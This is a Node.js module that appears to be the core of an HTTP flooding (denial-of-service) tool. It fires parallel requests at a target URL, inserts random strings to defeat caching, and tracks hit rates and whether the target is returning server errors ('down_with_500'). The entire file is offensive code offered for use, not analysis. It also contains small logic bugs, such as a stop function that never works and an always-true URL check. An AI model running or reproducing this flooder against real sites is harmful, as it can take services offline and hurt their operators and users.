const fetch = require('node-fetch');

let target,
    method,
    parallel = 4,
    payload,
    active_calls = 0,
    hit = 0,
    not_hit = 0,
    interval = null,
    last_error,
    code_500 = false,
    startDate,
    responseTimes = []

function getRandomString() {
    const length = Math.floor(Math.random() * 7) + 3;
    let result = '';
    let characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}


function getTargetUrl() {
    if (target && target.indexOf('*') >= -1) {
        return target.replace(/\*/g, getRandomString());
    }
    return target;
}

async function attack() {
    const url = getTargetUrl();
    active_calls++;
    const start = new Date();
    let opts = {method};
    if (payload && method.toLowerCase() !== 'get') {
        opts.body = payload;
    }
    fetch(url,opts)
        .then(res => {
            hit++;
            responseTimes.push(new Date().getTime() - start.getTime());
        })
        .catch(err => {
           last_error = err.message;
            not_hit++;
            try {
                const code = err.response.status;
                if (code) {
                    if (code >= 500) {
                        code_500++;
                    }
                }
                last_error = err.message;
            } catch (err) {
            }
        })
        .finally(() => {
            active_calls--;
            mainLoop();
        });
}

const shouldWait = function () {
    return active_calls >= parallel
};

module.exports.setStuff = function (a_target, a_parallel = 4, a_method = "get", a_payload = {}) {
    target = a_target
    method = a_method
    parallel = a_parallel
    payload = a_payload
};


function mainLoop() {
    if (!shouldWait()) {
        for (let i = 0; i < parallel - active_calls; i++) {
            attack();
        }
    }
}

module.exports.startAttack = function () {
    startDate = new Date();
    mainLoop()
}

module.exports.stop = function () {
    if (interval) {
        console.log('stopping interval');
        clearInterval(interval);
        interval = null;
        startDate = null;
    }
}

module.exports.resetState = function () {
    active_calls = 0;
    hit = 0;
    not_hit = 0;
    responseTimes = [];
    if (interval) {
        startDate = new Date();
    } else {
        startDate = null;
    }
}

module.exports.getStats = function () {
    let response_rate = 'unknown';
    if (startDate && hit) {
        let min = Math.abs((startDate.getTime() - new Date().getTime()) / 1000 / 60)
        response_rate = (hit / min).toFixed(0) + ' hit/min';
    }
    let minResponse = Math.min(...responseTimes,Infinity);
    let maxResponse = Math.max(...responseTimes,-1);
    if (minResponse === Infinity) {
        minResponse = 'unknown';
    }else{
        minResponse += 'ms';
    }

    if (maxResponse === -1) {
        maxResponse = 'unknown';
    }else{
        maxResponse += 'ms';
    }
    return {
        target_link:target,
        request_method:method,
        parallel, payload, active_calls,
        hit_count:hit,
        failed: not_hit,
        running: Boolean(interval),
        down_with_500: code_500,
        last_error,
        response_rate,
        min_response: minResponse,
        max_response: maxResponse,
        avg_response: ((responseTimes.reduce((acc, val) => acc + val, 1)) / responseTimes.length).toFixed(0),
    };
}

module.exports.printStatsInConsole = function () {
    console.clear();
    let str = '\n';
    const stats = module.exports.getStats();
    for (const key in stats) {
        const k = String(key).replace(/_/, ' ').split(' ').map(it => {
            it = it.substr(0,1).toUpperCase() + it.substr(1);
            return it;
        }).join(' ');
        let val = stats[key];
        if (typeof val === 'object') {
            val = JSON.stringify(val, null, '\t');
        }
        if (val) {
            str += `\t${k}:\t\t${val} \n`;
        }
    }
    str += '\n';
    str += 'Press Ctrl+C to stop';
    console.log(str);
}
